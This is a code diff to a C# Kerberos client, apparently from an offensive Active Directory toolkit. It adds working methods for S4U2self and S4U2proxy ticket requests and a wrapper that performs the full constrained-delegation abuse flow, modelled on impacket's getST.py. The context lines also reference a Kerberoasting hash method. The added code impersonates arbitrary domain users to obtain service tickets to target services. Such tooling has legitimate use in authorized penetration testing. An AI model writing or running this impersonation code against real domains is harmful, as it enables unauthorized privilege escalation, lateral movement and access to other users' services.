@@ -170,6 +170,62 @@ public static class KerberosClient
     }
 
     /// <summary>
+    /// S4U2self: using the service's own <paramref name="tgt"/>, request a service ticket to itself on
+    /// behalf of <paramref name="impersonate"/> and return the raw ticket (the additional-ticket for
+    /// the S4U2proxy step). This is the first half of constrained-delegation abuse (getST.py).
+    /// </summary>
+    public static byte[] GetS4u2SelfTicket(string kdcHost, Tgt tgt, string impersonate, int port = 88)
+    {
+        DateTimeOffset now = DateTimeOffset.UtcNow;
+        DateTimeOffset till = now.AddDays(1);
+        uint nonce = (uint)RandomNumberGenerator.GetInt32(int.MaxValue);
+        byte[] confounder = Krb5Cipher.NewConfounder(tgt.SessionKeyEtype);
+
+        byte[] req = S4uReq.BuildS4u2Self(tgt, impersonate, tgt.Realm, tgt.User, nonce, till, now, now.Microsecond, confounder);
+        TgsRep rep = TgsRep.Parse(KerberosTcpClient.SendReceive(kdcHost, req, port));
+        if (!rep.IsTgsRep)
+        {
+            throw new InvalidOperationException($"S4U2self failed for {impersonate}: {Krb5Constants.DescribeError(rep.ErrorCode)}");
+        }
+
+        return rep.Ticket;
+    }
+
+    /// <summary>
+    /// S4U2proxy: using <paramref name="s4u2SelfTicket"/> as an additional-ticket, request a ticket to
+    /// <paramref name="targetSpn"/> on behalf of the impersonated user, and return it — the usable
+    /// delegation ticket. The TGS-REP enc-part is decrypted with the TGT session key (usage 8).
+    /// </summary>
+    public static ServiceTicket GetS4u2ProxyTicket(string kdcHost, Tgt tgt, byte[] s4u2SelfTicket, string targetSpn, string impersonate, int port = 88)
+    {
+        DateTimeOffset now = DateTimeOffset.UtcNow;
+        DateTimeOffset till = now.AddDays(1);
+        uint nonce = (uint)RandomNumberGenerator.GetInt32(int.MaxValue);
+        byte[] confounder = Krb5Cipher.NewConfounder(tgt.SessionKeyEtype);
+
+        byte[] req = S4uReq.BuildS4u2Proxy(tgt, s4u2SelfTicket, targetSpn, nonce, till, now, now.Microsecond, confounder);
+        TgsRep rep = TgsRep.Parse(KerberosTcpClient.SendReceive(kdcHost, req, port));
+        if (!rep.IsTgsRep)
+        {
+            throw new InvalidOperationException($"S4U2proxy failed for {targetSpn}: {Krb5Constants.DescribeError(rep.ErrorCode)}");
+        }
+
+        byte[] plaintext = Krb5Cipher.Decrypt(tgt.SessionKeyEtype, tgt.SessionKey, 8, rep.EncPartCipher);
+        EncKdcRepPart part = EncKdcRepPart.Parse(plaintext);
+        return new ServiceTicket(rep.Ticket, part.SessionKeyEtype, part.SessionKey, tgt.Realm, impersonate);
+    }
+
+    /// <summary>
+    /// The full constrained-delegation flow (getST.py <c>-impersonate</c>): S4U2self then S4U2proxy,
+    /// yielding a service ticket to <paramref name="targetSpn"/> as <paramref name="impersonate"/>.
+    /// </summary>
+    public static ServiceTicket GetConstrainedDelegationTicket(string kdcHost, Tgt tgt, string impersonate, string targetSpn, int port = 88)
+    {
+        byte[] selfTicket = GetS4u2SelfTicket(kdcHost, tgt, impersonate, port);
+        return GetS4u2ProxyTicket(kdcHost, tgt, selfTicket, targetSpn, impersonate, port);
+    }
+
+    /// <summary>
     /// Requests a service ticket for <paramref name="spn"/> using <paramref name="tgt"/> and returns
     /// the Kerberoast hash string (<paramref name="account"/> is the owning account's name, used only
     /// to label the hash). Throws with the KDC error on failure.
